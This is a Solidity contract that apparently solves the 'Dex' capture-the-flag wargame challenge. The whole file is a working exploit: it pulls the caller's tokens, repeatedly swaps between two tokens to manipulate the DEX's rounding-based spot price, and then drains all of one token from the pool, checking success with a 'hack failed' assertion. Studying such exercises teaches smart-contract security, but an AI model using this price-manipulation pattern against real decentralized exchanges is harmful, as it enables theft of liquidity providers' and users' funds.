// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "../node_modules/@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IDex {
    function swap(
        address from,
        address to,
        uint256 amount
    ) external;
    function token1() external view returns(address);
    function token2() external view returns(address);
    function approve(address spender, uint256 amount) external;
}

contract Solution {
    IDex immutable private dex;
    IERC20 immutable private token1;
    IERC20 immutable private token2;

    constructor(
        IDex _dex
    ) {
        dex = _dex;
        token1 = IERC20(dex.token1());
        token2 = IERC20(dex.token2());
    }

    function _swap(IERC20 t1, IERC20 t2) private {
        dex.swap(address(t1), address(t2), t1.balanceOf(address(this)));
    }

    /// @notice Before calling this function
    // approve this contract for 10 tokens on both tokens
    function solve() external {
        // get all tokens from the attacker (msg.sender);
        token1.transferFrom(msg.sender, address(this), 10);
        token2.transferFrom(msg.sender, address(this), 10);

        // approve the dex to spend all tokens from this contract
        dex.approve(address(dex), type(uint256).max);

        // swap 5 times
        _swap(token1, token2);
        _swap(token2, token1);
        _swap(token1, token2);
        _swap(token2, token1);
        _swap(token1, token2);

        // finally swap 45 token2 to get all the token1 (110) from dex
        dex.swap(address(token2), address(token1), 45);

        // make sure that dex has now 0 token1
        require(token1.balanceOf(address(dex)) == 0, "hack failed");
    }
}